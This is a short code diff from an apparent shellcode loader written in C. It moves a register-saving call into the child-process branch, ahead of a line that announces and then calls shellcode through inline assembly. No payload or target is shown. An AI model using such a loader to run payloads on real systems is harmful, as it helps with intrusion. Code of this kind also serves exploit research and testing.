@@ -93,10 +93,10 @@ int main(int argc, char **argv) {
     goto __must_unmap;
   }
 
-  printf("[*] Saving register state..\n");
-  save_regs(&__serialize_regs(cregs));
-
   if (!pid) {
+    printf("[*] Saving register state..\n");
+    save_regs(&__serialize_regs(cregs));
+
     printf("[*] Executing the shellcode..\n");
     __asm__ __volatile__("call *%%eax\r\n" : : "a"(pcall));
   } else {
